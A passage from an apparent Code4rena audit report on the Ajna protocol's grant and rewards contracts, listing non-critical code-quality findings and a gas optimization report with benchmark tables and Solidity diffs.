## [06] CODE COMMENT FOR `CHALLENGE_PERIOD_LENGTH` CAN BE MORE ACCURATE
The challenge phase starts after the time for `DISTRIBUTION_PERIOD_LENGTH` is finished. The time for `CHALLENGE_PERIOD_LENGTH` is more of an addition to the distribution period instead of part of the distribution period. Thus, describing `CHALLENGE_PERIOD_LENGTH` as `Length of the challengephase of the distribution period` given that `DISTRIBUTION_PERIOD_LENGTH` is described as `Length of the distribution period` is somewhat misleading. To avoid confusion, the comment for `CHALLENGE_PERIOD_LENGTH` can be updated to indicate that `CHALLENGE_PERIOD_LENGTH` is not included in `DISTRIBUTION_PERIOD_LENGTH`.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L29-L34
```solidity
    /**
     * @notice Length of the challengephase of the distribution period in blocks.
     * @dev    Roughly equivalent to the number of blocks in 7 days.
     * @dev    The period in which funded proposal slates can be checked in updateSlate.
     */
    uint256 internal constant CHALLENGE_PERIOD_LENGTH = 50400;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L36-L40
```solidity
    /**
     * @notice Length of the distribution period in blocks.
     * @dev    Roughly equivalent to the number of blocks in 90 days.
     */
    uint48 internal constant DISTRIBUTION_PERIOD_LENGTH = 648000;
```

## [07] SETTING `support` TO `1` WHEN `voteParams_.votesUsed < 0` IS FALSE IN `StandardFunding._fundingVote` FUNCTION IS REDUNDANT
When calling the following `StandardFunding._fundingVote` function, `uint8 support = 1` is executed before `voteParams_.votesUsed < 0 ? support = 0 : support = 1`. Therefore, when `voteParams_.votesUsed < 0` is false, `support` does not need to be set to `1` again. Please consider refactoring the code to only update `support` to `0` when `voteParams_.votesUsed < 0` is true.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690
```solidity
    function _fundingVote(
        QuarterlyDistribution storage currentDistribution_,
        Proposal storage proposal_,
        address account_,
        QuadraticVoter storage voter_,
        FundingVoteParams memory voteParams_
    ) internal returns (uint256 incrementalVotesUsed_) {
        uint8  support = 1;
        uint256 proposalId = proposal_.proposalId;

        // determine if voter is voting for or against the proposal
        voteParams_.votesUsed < 0 ? support = 0 : support = 1;
        ...
    }
```

## [08] REDUNDANT EXECUTION OF `if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()` IN `StandardFunding._fundingVote` FUNCTION
The following `StandardFunding._fundingVote` function executes `if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()` before `uint128 cumulativeVotePowerUsed = SafeCast.toUint128(sumOfTheSquareOfVotesCast)`. Because calling the `SafeCast.toUint128` function below would revert when `sumOfTheSquareOfVotesCast > type(uint128).max` is true, executing `if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()` becomes redundant. Please consider removing `if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower()` from the `StandardFunding._fundingVote` function.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L690
```solidity
    function _fundingVote(
        QuarterlyDistribution storage currentDistribution_,
        Proposal storage proposal_,
        address account_,
        QuadraticVoter storage voter_,
        FundingVoteParams memory voteParams_
    ) internal returns (uint256 incrementalVotesUsed_) {
        ...
        // calculate the cumulative cost of all votes made by the voter
        // and check that attempted votes cast doesn't overflow uint128
        uint256 sumOfTheSquareOfVotesCast = _sumSquareOfVotesCast(votesCast);
        if (sumOfTheSquareOfVotesCast > type(uint128).max) revert InsufficientVotingPower();
        uint128 cumulativeVotePowerUsed = SafeCast.toUint128(sumOfTheSquareOfVotesCast);
        ...
    }
```

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L290-L293
```solidity
    function toUint128(uint256 value) internal pure returns (uint128) {
        require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");
        return uint128(value);
    }
```

## [09] `InvalidVote` ERROR CAN BE MORE DESCRIPTIVE
The following `StandardFunding.fundingVote` and `StandardFunding.screeningVote` functions can revert with the `InvalidVote` error for various reasons. Yet, executing `revert InvalidVote()` does not describe the specific reason. To be more descriptive and user-friendly, please consider updating the `InvalidVote` error so it can provide the reason why calling the corresponding function reverts.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569
```solidity
    function fundingVote(
        FundingVoteParams[] memory voteParams_
    ) external override returns (uint256 votesCast_) {
        ...
        uint256 endBlock = currentDistribution.endBlock;

        uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);

        // check that the funding stage is active
        if (block.number <= screeningStageEndBlock || block.number > endBlock) revert InvalidVote();
        ...
        for (uint256 i = 0; i < numVotesCast; ) {
            Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];

            // check that the proposal is part of the current distribution period
            if (proposal.distributionId != currentDistributionId) revert InvalidVote();

            // check that the proposal being voted on is in the top ten screened proposals
            if (_findProposalIndex(voteParams_[i].proposalId, _topTenProposals[currentDistributionId]) == -1) revert InvalidVote();
            ...
        }
    }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596
```solidity
    function screeningVote(
        ScreeningVoteParams[] memory voteParams_
    ) external override returns (uint256 votesCast_) {
        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];

        // check screening stage is active
        if (block.number < currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();

        uint256 numVotesCast = voteParams_.length;

        for (uint256 i = 0; i < numVotesCast; ) {
            Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];

            // check that the proposal is part of the current distribution period
            if (proposal.distributionId != currentDistribution.id) revert InvalidVote();
            ...
        }
    }
```

## [10] UNDERSCORES CAN BE ADDED FOR NUMBERS
It is a common practice to separate each 3 digits in a number by an underscore to improve code readability. Unlike `MAX_EFM_PROPOSAL_LENGTH` below, the following `CHALLENGE_PERIOD_LENGTH`, `DISTRIBUTION_PERIOD_LENGTH`, and `FUNDING_PERIOD_LENGTH` do not use underscores; please consider adding underscores for these numbers.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L34
```solidity
    uint256 internal constant CHALLENGE_PERIOD_LENGTH = 50400;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L40
```solidity
    uint48 internal constant DISTRIBUTION_PERIOD_LENGTH = 648000;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L46
```solidity
    uint256 internal constant FUNDING_PERIOD_LENGTH = 72000;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L23
```solidity
    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month
```

## [11] `uint256` CAN BE USED INSTEAD OF `uint`
Both `uint` and `uint256` are used in the protocol's code. In favor of explicitness, please consider using `uint256` instead of `uint` in the following code.

```solidity
ajna-grants\src\grants\base\StandardFunding.sol
  208: for (uint i = 0; i < numFundedProposals; ) {
  324: for (uint i = 0; i < numProposalsInSlate; ) {
  434: for (uint i = 0; i < numProposalsInSlate_; ) {
  468: for (uint i = 0; i < numProposals; ) {
  469: for (uint j = i + 1; j < numProposals; ) {
  491: for (uint i = 0; i < proposalIdSubset_.length;) {
```

## [12] SPACES CAN BE ADDED FOR BETTER READABILITY
For better readability, spaces can be added in code where appropriate.

A space can be added between `challenge` and `phase` in the following comment.<br>
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L30
```solidity
     * @notice Length of the challengephase of the distribution period in blocks.
```

A space can be added between `returns` and `(uint256` in the following code.<br>
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L238
```solidity
    ) external override returns(uint256 rewardClaimed_) {
```

A space can be added between `currentSlateHash` and `!=` in the following code.<br>
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L318
```solidity
            (currentSlateHash!= 0 && sum > _sumProposalFundingVotes(_fundedProposalSlates[currentSlateHash]));
```

## Additional Low Risk and Non-Critical Issues

The following individual submissions from **rbserver** also detail low risk and non-critical issues. The judge considered these alongside rbserver's report above in determining the top score. For full details and discussions, please view the original submissions linked below.

- [`StandardFunding` contract's functionalities for proposals with positive `tokensRequested` can be DOS'ed for `_distributions[1]`](https://github.com/code-423n4/2023-05-ajna-findings/issues/297)
- [Users are able to call `StandardFunding.claimDelegateReward` function to claim delegate rewards when `block.number` is end block of challenge period in which challenge period is not ended though they should not be allowed to do so](https://github.com/code-423n4/2023-05-ajna-findings/issues/296)
- [`StandardFunding._getDelegateReward` function does not factor in votes used by user during screening stage for calculating user's delegate reward](https://github.com/code-423n4/2023-05-ajna-findings/issues/295)
- [User can receive 0 delegate reward though she or he should receive a positive amount of such reward](https://github.com/code-423n4/2023-05-ajna-findings/issues/293)
- [`Funding._getVotesAtSnapshotBlocks` function does not take into account user's available votes between snapshot blocks](https://github.com/code-423n4/2023-05-ajna-findings/issues/291)
- [Calling `StandardFunding.startNewDistributionPeriod` function can cause `fundsAvailable` for new distribution period to be less than it should be](https://github.com/code-423n4/2023-05-ajna-findings/issues/290)
- [User can call `StandardFunding.updateSlate` function to frontrun other user's `StandardFunding.updateSlate` transaction](https://github.com/code-423n4/2023-05-ajna-findings/issues/286)



***

# Gas Optimizations

For this audit, 32 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-05-ajna-findings/issues/284) by **JCN** received the top score from the judge.

*The following wardens also submitted reports: [0xSmartContract](https://github.com/code-423n4/2023-05-ajna-findings/issues/501), [pontifex](https://github.com/code-423n4/2023-05-ajna-findings/issues/491), _SS](https://github.com/code-423n4/2023-05-ajna-findings/issues/482), [Walter](https://github.com/code-423n4/2023-05-ajna-findings/issues/471), [petrichor](https://github.com/code-423n4/2023-05-ajna-findings/issues/469), [Rageur](https://github.com/code-423n4/2023-05-ajna-findings/issues/460), [Kenshin](https://github.com/code-423n4/2023-05-ajna-findings/issues/455), [0x73696d616f](https://github.com/code-423n4/2023-05-ajna-findings/issues/453), [yongskiws](https://github.com/code-423n4/2023-05-ajna-findings/issues/442), [SAQ](https://github.com/code-423n4/2023-05-ajna-findings/issues/421), [Shubham](https://github.com/code-423n4/2023-05-ajna-findings/issues/395), [Tomio](https://github.com/code-423n4/2023-05-ajna-findings/issues/392), [descharre](https://github.com/code-423n4/2023-05-ajna-findings/issues/391), [j4ld1na](https://github.com/code-423n4/2023-05-ajna-findings/issues/370), [Aymen0909](https://github.com/code-423n4/2023-05-ajna-findings/issues/364), [0xnev](https://github.com/code-423n4/2023-05-ajna-findings/issues/349), [patitonar](https://github.com/code-423n4/2023-05-ajna-findings/issues/332), [Raihan](https://github.com/code-423n4/2023-05-ajna-findings/issues/318), [ReyAdmirado](https://github.com/code-423n4/2023-05-ajna-findings/issues/315), [hunter\_w3b](https://github.com/code-423n4/2023-05-ajna-findings/issues/302), [kaveyjoe](https://github.com/code-423n4/2023-05-ajna-findings/issues/267), [SAAJ](https://github.com/code-423n4/2023-05-ajna-findings/issues/249), [Audit\_Avengers](https://github.com/code-423n4/2023-05-ajna-findings/issues/245), [Blckhv](https://github.com/code-423n4/2023-05-ajna-findings/issues/216), [ayden](https://github.com/code-423n4/2023-05-ajna-findings/issues/210), [K42](https://github.com/code-423n4/2023-05-ajna-findings/issues/163), [codeslide](https://github.com/code-423n4/2023-05-ajna-findings/issues/137), [Eurovickk](https://github.com/code-423n4/2023-05-ajna-findings/issues/29), [dicethedev](https://github.com/code-423n4/2023-05-ajna-findings/issues/13), and [okolicodes](https://github.com/code-423n4/2023-05-ajna-findings/issues/5).*

## Summary
A majority of the optimizations were benchmarked via the protocol's tests, i.e. using the following config for `ajna-core`: `solc version 0.8.14`, `optimizer on`, `500 runs` and the following config for `ajna-grants`: `solc version 0.8.16`, `optimizer on`, `1000000 runs`. Optimizations that were not benchmarked are explained via EVM gas costs and opcodes.

Below are the overall average gas savings for the following tested functions, with all the optimizations applied (not including G-11, G-12, and G-14):
| Function |    Before   |    After   | Avg Gas Savings |
| ------ | -------- | -------- | ------- |
| GrantFund.claimDelegateReward |  65340  |  42268  | 23072 | 
| GrantFund.executeExtraordinary |  95823  |  95682  | 141 | 
| GrantFund.executeStandard |  47894  |  47520  | 374 | 
| GrantFund.fundTreasury |  65872  |  65788  | 84 | 
| GrantFund.fundingVote |  409345  |  396776  | 12569 | 
| GrantFund.proposeExtraordinary |  86505  |  86451  | 54 | 
| GrantFund.proposeStandard |  82900  |  82820  | 80 | 
| GrantFund.screeningVote |  399146  |  390626  | 8520 | 
| GrantFund.startNewDistributionPeriod |  75597  |  75139  | 458 | 
| GrantFund.updateSlate |  318329  |  310231  | 8098 | 
| GrantFund.voteExtraordinary |  31424  |  30811  | 613 | 
| PositionManager.burn |  10451  |  8524  | 1927 | 
| PositionManager.memorializePositions |  1134444  |  1133268  | 1176 | 
| PositionManager.mint |  98876  |  97653  | 1223 | 
| PositionManager.permit |  54387  |  32554  | 21833 | 
| RewardsManager.claimRewards |  393064  |  381560  | 11504 | 
| RewardsManager.moveStakedLiquidity |  2112272  |  2081035  | 31237 | 

**Total gas saved across all listed functions: 122963**

*Notes*: 

- The `Avg`, `Med`, and `# of calls` differs between each test since fuzzing it used. Therefore, we will examine the differences in the `Max` column, which stays the same, in order to calculate the gas difference.
- The Gas report output, after all optimizations have been applied, can be found at the end of the report.
- The final diffs for each contract, with all the optimizations applied, can be found [here](https://gist.github.com/0xJCN/f01a24cd9e0996a1a36913cba06688a2).

## Gas Optimizations
| Number |Issue|Instances|
|-|:-|:-:|
| [G-01] | Use calldata instead of memory for function arguments that do not get mutated | 19 | 
| [G-02] | State variables can be cached instead of re-reading them from storage | 6 |
| [G-03] | Refactor internal function to avoid unnecessary SLOAD | 1 |
| [G-04] | Using storage instead of memory for structs/arrays saves gas | 11 |
| [G-05] | Avoid emitting storage values | 1 |
| [G-06] | Multiple accesses of a mapping/array should use a storage pointer | 14 |
| [G-07] | Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate | 3 |
| [G-08] | Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead | 2 |
| [G-09] | Use `do while` loops instead of `for` loops | 14 |
| [G-10] | Use assembly to perform efficient back-to-back calls | 2 |
| [G-11] | Refactor event to avoid emitting data that is already present in transaction data | 2 |
| [G-12] | Refactor event to avoid emitting empty data | 5 |
| [G-13] | Sort array offchain to check duplicates in O(n) instead of O(n^2) | 1 |

## [G-01] Use calldata instead of memory for function arguments that do not get mutated
When you specify a data location as `memory`, that value will be copied into memory. When you specify the location as `calldata`, the value will stay static within calldata. If the value is a large, complex type, using `memory` may result in extra memory expansion costs.

**Note: We are not able to change [`_hashProposals`](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L152-L157) , [`_validateCallDatas`](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L103-L107), and [`proposeExtraordinary`](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L90) to take `calldata` arguments due to `stack too deep` errors.**

Total Instances: `19`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L135-L140

*Gas Savings for `RewardsManager.moveStakedLiquidity`, obtained via protocol's tests: Avg 1195 gas*

|        |    Max   |
| ------ | -------- |
| Before |  2112272 |  
| After  |  2111077 | 

```solidity
File: ajna-core/src/RewardsManager.sol
135:    function moveStakedLiquidity(
136:        uint256 tokenId_,
137:        uint256[] memory fromBuckets_,
138:        uint256[] memory toBuckets_,
139:        uint256 expiry_
140:    ) external nonReentrant override {
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..2e263b4 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -134,8 +134,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
      */
     function moveStakedLiquidity(
         uint256 tokenId_,
-        uint256[] memory fromBuckets_,
-        uint256[] memory toBuckets_,
+        uint256[] calldata fromBuckets_,
+        uint256[] calldata toBuckets_,
         uint256 expiry_
     ) external nonReentrant override {
         StakeInfo storage stakeInfo = stakes[tokenId_];
@@ -147,16 +147,18 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         if (fromBucketLength != toBuckets_.length) revert MoveStakedLiquidityInvalid();

         address ajnaPool = stakeInfo.ajnaPool;
-        uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();
+        { // to fix `stack too deep` error
+            uint256 curBurnEpoch = IPool(ajnaPool).currentBurnEpoch();

-        // claim rewards before moving liquidity, if any
-        _claimRewards(
-            stakeInfo,
-            tokenId_,
-            curBurnEpoch,
-            false,
-            ajnaPool
-        );
+            // claim rewards before moving liquidity, if any
+            _claimRewards(
+                stakeInfo,
+                tokenId_,
+                curBurnEpoch,
+                false,
+                ajnaPool
+            );
+        }

         uint256 fromIndex;
         uint256 toIndex;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L521

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612-L618

*Gas Savings for `GrantFund.fundingVote`, obtained via protocol's tests: Avg 1589 gas*

|        |    Max   |
| ------ | -------- |
| Before |   409345 |  
| After  |   407756 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
519:    function fundingVote(
520:        FundingVoteParams[] memory voteParams_
521:    ) external override returns (uint256 votesCast_) {

612:    function _fundingVote(
613:        QuarterlyDistribution storage currentDistribution_,
614:        Proposal storage proposal_,
615:        address account_,
616:        QuadraticVoter storage voter_,
617:        FundingVoteParams memory voteParams_
618:    ) internal returns (uint256 incrementalVotesUsed_) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..88f37a0 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -517,31 +517,33 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function fundingVote(
-        FundingVoteParams[] memory voteParams_
+        FundingVoteParams[] calldata voteParams_
     ) external override returns (uint256 votesCast_) {
         uint24 currentDistributionId = _currentDistributionId;

         QuarterlyDistribution storage currentDistribution = _distributions[currentDistributionId];
         QuadraticVoter        storage voter               = _quadraticVoters[currentDistributionId][msg.sender];

-        uint256 endBlock = currentDistribution.endBlock;
+        { // @audit: needed to fix `stack too deep` error
+            uint256 endBlock = currentDistribution.endBlock;

-        uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);
+            uint256 screeningStageEndBlock = _getScreeningStageEndBlock(endBlock);

-        // check that the funding stage is active
-        if (block.number <= screeningStageEndBlock || block.number > endBlock) revert InvalidVote();
+            // check that the funding stage is active
+            if (block.number <= screeningStageEndBlock || block.number > endBlock) revert InvalidVote();

-        uint128 votingPower = voter.votingPower;
+            uint128 votingPower = voter.votingPower;

-        // if this is the first time a voter has attempted to vote this period,
-        // set initial voting power and remaining voting power
-        if (votingPower == 0) {
+            // if this is the first time a voter has attempted to vote this period,
+            // set initial voting power and remaining voting power
+            if (votingPower == 0) {

-            // calculate the voting power available to the voting power in this funding stage
-            uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock));
+                // calculate the voting power available to the voting power in this funding stage
+                uint128 newVotingPower = SafeCast.toUint128(_getVotesFunding(msg.sender, votingPower, voter.remainingVotingPower, screeningStageEndBlock));

-            voter.votingPower          = newVotingPower;
-            voter.remainingVotingPower = newVotingPower;
+                voter.votingPower          = newVotingPower;
+                voter.remainingVotingPower = newVotingPower;
+            }
         }

         uint256 numVotesCast = voteParams_.length;
@@ -614,7 +616,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         Proposal storage proposal_,
         address account_,
         QuadraticVoter storage voter_,
-        FundingVoteParams memory voteParams_
+        FundingVoteParams calldata voteParams_
     ) internal returns (uint256 incrementalVotesUsed_) {
         uint8  support = 1;
         uint256 proposalId = proposal_.proposalId;
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L574

*Gas Savings for `GrantFund.screeningVote`, obtained via protocol's tests: Avg 2678 gas*

|        |    Max   |
| ------ | -------- |
| Before |   399146 |  
| After  |   396468 | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
572:    function screeningVote(
573:        ScreeningVoteParams[] memory voteParams_
574:    ) external override returns (uint256 votesCast_) {
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..550cf53 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -570,7 +570,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function screeningVote(
-        ScreeningVoteParams[] memory voteParams_
+        ScreeningVoteParams[] calldata voteParams_
     ) external override returns (uint256 votesCast_) {
         QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];

```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L22-L27

*Gas Savings for `GrantFund.hashProposal`, obtained via protocol's tests: Avg 127 gas*

|        |    Max   |
| ------ | -------- |
| Before |   3843   |  
| After  |   3716   | 

```solidity
File: ajna-grants/src/grants/GrantFund.sol
22:    function hashProposal(
23:        address[] memory targets_,
24:        uint256[] memory values_,
25:        bytes[] memory calldatas_,
26:        bytes32 descriptionHash_
27:    ) external pure override returns (uint256 proposalId_) {
```
```diff
diff --git a/src/grants/GrantFund.sol b/src/grants/GrantFund.sol
index 3d568b0..4c21753 100644
--- a/src/grants/GrantFund.sol
+++ b/src/grants/GrantFund.sol
@@ -20,9 +20,9 @@ contract GrantFund is IGrantFund, ExtraordinaryFunding, StandardFunding {

     /// @inheritdoc IGrantFund
     function hashProposal(
-        address[] memory targets_,
-        uint256[] memory values_,
-        bytes[] memory calldatas_,
+        address[] calldata targets_,
+        uint256[] calldata values_,
+        bytes[] calldata calldatas_,
         bytes32 descriptionHash_
     ) external pure override returns (uint256 proposalId_) {
         proposalId_ = _hashProposal(targets_, values_, calldatas_, descriptionHash_);
```

The instances below do not save a lot of gas because they each call `_hashProposal`, which loads all the calldata arrays into memory so even if all the parameters are set to `calldata` they will all eventually be loaded into memory in the `_hashProposal`. In addition, some parameters in `proposeStandard` must stay as `memory` due to `stack too deep` errors.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L52-L57

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L56-L61

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L343-L348

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L366-L371

*Gas Savings for `GrantFund.executeExtraordinary`, obtained via protocol's tests: Avg 64 gas*

|        |    Max   |
| ------ | -------- |
| Before |   95823  |  
| After  |   95759  | 

*Gas Savings for `GrantFund.executeStandard`, obtained via protocol's tests: Avg 64 gas*

|        |    Max   |
| ------ | -------- |
| Before |   47894  |  
| After  |   47830  | 

*Gas Savings for `GrantFund.proposeStandard`, obtained via protocol's tests: Avg 46 gas*

|        |    Max   |
| ------ | -------- |
| Before |   82900  |  
| After  |   82854  | 

```solidity
File: ajna-grants/src/grants/base/Funding.sol
52:    function _execute(
53:        uint256 proposalId_,
54:        address[] memory targets_,
55:        uint256[] memory values_,
56:        bytes[] memory calldatas_
57:    ) internal {

56:    function executeExtraordinary(
57:        address[] memory targets_,
58:        uint256[] memory values_,
59:        bytes[] memory calldatas_,
60:        bytes32 descriptionHash_
61:    ) external nonReentrant override returns (uint256 proposalId_) {

343:    function executeStandard(
344:        address[] memory targets_,
345:        uint256[] memory values_,
346:        bytes[] memory calldatas_,
347:        bytes32 descriptionHash_
348:    ) external nonReentrant override returns (uint256 proposalId_) {

366:    function proposeStandard(
367:        address[] memory targets_,
368:        uint256[] memory values_,
369:        bytes[] memory calldatas_,
370:        string memory description_
371:    ) external override returns (uint256 proposalId_) {
```
```diff
diff --git a/src/grants/base/Funding.sol b/src/grants/base/Funding.sol
index 72fafb9..d5c58d1 100644
--- a/src/grants/base/Funding.sol
+++ b/src/grants/base/Funding.sol
@@ -51,9 +51,9 @@ abstract contract Funding is IFunding, ReentrancyGuard {
      */
     function _execute(
         uint256 proposalId_,
-        address[] memory targets_,
-        uint256[] memory values_,
-        bytes[] memory calldatas_
+        address[] calldata targets_,
+        uint256[] calldata values_,
+        bytes[] calldata calldatas_
     ) internal {
         // use common event name to maintain consistency with tally
         emit ProposalExecuted(proposalId_);
```
```diff
diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol
index 4a70abb..43bba61 100644
--- a/src/grants/base/ExtraordinaryFunding.sol
+++ b/src/grants/base/ExtraordinaryFunding.sol
@@ -54,9 +54,9 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {

     /// @inheritdoc IExtraordinaryFunding
     function executeExtraordinary(
-        address[] memory targets_,
-        uint256[] memory values_,
-        bytes[] memory calldatas_,
+        address[] calldata targets_,
+        uint256[] calldata values_,
+        bytes[] calldata calldatas_,
         bytes32 descriptionHash_
     ) external nonReentrant override returns (uint256 proposalId_) {
         proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..ceef9f5 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -341,9 +341,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function executeStandard(
-        address[] memory targets_,
-        uint256[] memory values_,
-        bytes[] memory calldatas_,
+        address[] calldata targets_,
+        uint256[] calldata values_,
+        bytes[] calldata calldatas_,
         bytes32 descriptionHash_
     ) external nonReentrant override returns (uint256 proposalId_) {
         proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_STANDARD, descriptionHash_)));
@@ -364,8 +364,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function proposeStandard(
-        address[] memory targets_,
-        uint256[] memory values_,
+        address[] calldata targets_,
+        uint256[] calldata values_,
         bytes[] memory calldatas_,
         string memory description_
     ) external override returns (uint256 proposalId_) {
```

## [G-02] State variables can be cached instead of re-reading them from storage
Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read.

**Note: Some view functions are included below since they are called within state mutating functions.**

Total Instances: `6`

Estimated Gas Saved: `6 * 100 = 600`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215

### Cache `_fundedExtraordinaryProposals.length` to save 1 SLOAD
```solidity
File: ajna-grants/src/grants/base/ExtraordinaryFunding.sol
206:    function _getMinimumThresholdPercentage() internal view returns (uint256) {
207:        // default minimum threshold is 50
208:        if (_fundedExtraordinaryProposals.length == 0) { // @audit: 1st sload
209:            return 0.5 * 1e18;
210:        }
211:        // minimum threshold increases according to the number of funded EFM proposals
212:        else {
213:            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18)); // @audit: 2nd sload
214:        }
215:    }
```
```diff
diff --git a/src/grants/base/ExtraordinaryFunding.sol b/src/grants/base/ExtraordinaryFunding.sol
index 4a70abb..0acc0a3 100644
--- a/src/grants/base/ExtraordinaryFunding.sol
+++ b/src/grants/base/ExtraordinaryFunding.sol
@@ -205,12 +205,13 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {
      */
     function _getMinimumThresholdPercentage() internal view returns (uint256) {
         // default minimum threshold is 50
-        if (_fundedExtraordinaryProposals.length == 0) {
+        uint256 length = _fundedExtraordinaryProposals.length;
+        if (length == 0) {
             return 0.5 * 1e18;
         }
         // minimum threshold increases according to the number of funded EFM proposals
         else {
-            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));
+            return 0.5 * 1e18 + (length * (0.05 * 1e18));
         }
     }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L388-L391

### Cache return value from `_validateCallDatas(targets_, values_, calldatas_)` to save 1 SLOAD
```solidity
File: ajna-grants/base/StandardFunding.sol
388:        newProposal.tokensRequested = _validateCallDatas(targets_, values_, calldatas_); // check proposal parameters are valid and update tokensRequested
389:        // revert if proposal requested more tokens than are available in the distribution period
390:        if (newProposal.tokensRequested > (currentDistribution.fundsAvailable * 9 / 10)) revert InvalidProposal(); // @audit: unnecessary sload, emit return value from internal call
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..cf158b2 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -385,10 +385,11 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         // store new proposal information
         newProposal.proposalId      = proposalId_;
